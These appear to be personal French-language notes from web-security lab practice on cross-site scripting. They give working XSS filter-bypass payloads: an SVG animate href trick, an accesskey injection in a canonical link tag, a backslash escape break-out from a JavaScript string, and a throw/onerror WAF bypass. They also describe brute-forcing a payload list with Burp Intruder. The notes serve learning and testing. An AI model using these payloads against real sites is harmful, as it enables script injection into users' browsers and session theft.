XSS: 

essayer d’abord une balise simple script ou html.

Si il y a des filtres de baliser essayer ce genre de payload:


surligné = le payload ajouté sur BURP SUITE repeater

		                                    	—------------------------------------------------------
payload pas mal quand les event handlers et attributs href sont sont boqués,


à mettre directement dans l’url, le voici non encodé: 

```
<svg>
<a>
<animate attributeName=href values=javascript:alert(1) />
<text x=20 y=20>Click me</text>
</a> 

```

                                        	—------------------------------------------------------

pour un lab particulier j’ai utilisé une liste de payload: https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt

que j’ai mis dans burp intruder, j’ai checké les seuls status 200 et essayé directement dans la webApp, attention aux nombres de requêtes ? 


                                        	—------------------------------------------------------

XSS très intéréssante sur ce Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag 

l'idée est de rediriger avec une accesskey qui déclenche l'XSS. 

https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1) lien du lab avec l'access key encoded


                                        	—------------------------------------------------------

Certaines applications tentent d'empêcher l'intrusion de données hors de la chaîne JavaScript en échappant tout caractère d'apostrophe avec un antislash. Un antislash devant un caractère indique au parseur JavaScript que le caractère doit être interprété littéralement et non comme un caractère spécial tel qu'un terminateur de chaîne. Dans cette situation, les applications font souvent l'erreur de ne pas échapper le caractère antislash lui-même. Cela signifie qu'un attaquant peut utiliser son propre caractère antislash pour neutraliser celui ajouté par l'application.

ce payload : `';alert(document.domain)//`

devient: `\';alert(document.domain)//`

donc on peut utiliser ce genre de payload: `\';alert(document.domain)//`

pour qu'il soit interprété ainsi: `\\';alert(document.domain)//`

                                        	—------------------------------------------------------

utilisation de `throw` pour l'XSS pour éviter le filtre WAF: 


`x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`